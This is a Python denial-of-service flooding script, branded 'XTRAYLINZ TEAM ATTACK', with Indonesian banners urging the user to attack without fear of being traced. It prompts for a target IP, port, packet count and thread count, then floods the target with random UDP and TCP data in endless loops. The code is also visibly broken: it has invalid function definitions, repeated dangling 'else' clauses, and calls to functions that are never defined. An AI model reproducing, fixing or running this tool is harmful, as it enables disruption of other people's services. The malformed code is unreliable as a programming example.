#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > BISMILLAH DULU < - - ")
print       (" - - > DOSA URUSAN NANTI < - - ")
print       (" - - > KALO IP LU KETAHUAN DONT SCARED <- - ")                                   
print       (" - - > MEREKA CUMAN NAKUTIN LU NGELACAK < - - ")
print       (" - - > OKEH GAS < - - ")
print       (" - - > SERANGGGGGGGGGGGGGGGGG!!!! < - - ")
print       (" - - > RINUS WILL BE ATTACKING < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" (y/n):"))
times = int(input(" Paket :"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1400)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XTRAYLINZ TEAM ATTACK ")
		except:
			print("[!] RUSAK")

def run2():
	data = random._urandom(1800)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XTRAYLINZ TEAM ATTACK ")
		except:
			s.close()
			print("[*] RUSAK")

def run3():
	data = random._urandom(1180)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XTRAYLINZ TEAM ATTACK ")
		except:
			s.close()
			print("[*] RUSAK")

def run4():
	data = random._urandom(1800)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XTRAYLINZ TEAM ATTACK ")
		except:
			s.close()
			print("[*] RUSAK")

def run(5):
	data = random._urandom(1800)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XTRAYLINZ TEAM ATTACK ")
		except:
			print("[!] RUSAK")

def run2(6):
	data = random._urandom(1450)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XTRAYLINZ TEAM ATTACK ")
		except:
			s.close()
			print("[*] RUSAK")

def run3(7):
	data = random._urandom(65000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XTRAYLINZ TEAM ATTACK ")
		except:
			s.close()
			print("[*] RUSAK")

def run8():
	data = random._urandom(1920)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XTRAYLINZ TEAM ATTACK ")
		except:
			s.close()
			print("[*] RUSAK")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
	else:
                th = threading.Thread(target = run3)
                th.start()
        else:
                th = threading.Thread(target = run4)
                th.start()
        else:
		th = threading.Thread(target = run5)
		th.start()
	else:
                th = threading.Thread(target = run6)
                th.start()
        else:
                th = threading.Thread(target = run7)
                th.start()
        else:
                th = threading.Thread(target = run8)
                th.start()
